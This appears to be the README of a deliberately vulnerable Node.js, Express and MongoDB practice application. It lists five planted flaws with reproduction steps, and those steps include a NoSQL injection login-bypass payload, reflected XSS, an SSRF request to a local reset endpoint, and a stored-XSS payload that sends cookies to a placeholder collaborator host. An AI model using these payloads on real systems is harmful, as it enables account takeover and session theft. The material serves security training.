# Simple Application

## System Info

- **Server environment**: Node.js
- **Web Framework**: Express
- **Database**: MongoDB
- **Platform (developed on)**: Ubuntu 20.04

## Features

1. User login
2. User Registration
3. Search Users
4. Download images via URL

## Weaknesses

1. Authentication can be bypassed by NoSQL injection in the login form
2. Reflected cross-site scripting in the user search form
3. Can induce the server to make requests using SSRF in image download feature
4. Admin account can be compromised using stored XSS in the registration form
5. User's personal information can be accessed via direct endpoint

## Steps to Reproduce

1. **NoSQL Injection**
- Go to the login page.
- Enter any valid username and any password while intercepting the request in Burp.
- Replace the value of the Content-Type header with the below data to change it to JSON.
`application/json;charset=UTF-8`
- Replace the request body with the below JSON data containing the payload.
`{"username":"admin","password":{"$ne": 1}}`
- Send the request to get authenticated.
	
2. **Reflected XSS**
- Get authenticated and go to the user search page.
- Enter the below XSS payload in the search bar and submit to execute it.
`<script>alert(document.domain)</script>`
		
3. **Server-side request forgery (SSRF)**
- Get authenticated and go to the image download page.
- Enter the below URL in the URL field and submit to induce a request on behalf of the server that will reset the application database.
http://localhost:3000/reset
		
4. **Account takeover via Stored XSS**
- Go to the registration page and create a user with the below username
`<script>var i=new Image;i.src="http://<BURP-COLLABORATOR-PAYLOAD>/?"+document.cookie;</script>`
- Wait for the admin to login and access all user's data.
- Once done, get admin's session ID in Burp collaborator client.
- Get authenticated and replace the session ID with admin's using the Storage tab in the browser dev tools.
- Refresh the page to get a session as the admin.
	
5. **Information disclosure via direct endpoint**
- Send a POST request to the below endpoint to get the data of all the users.
http://localhost:3000/admin/users
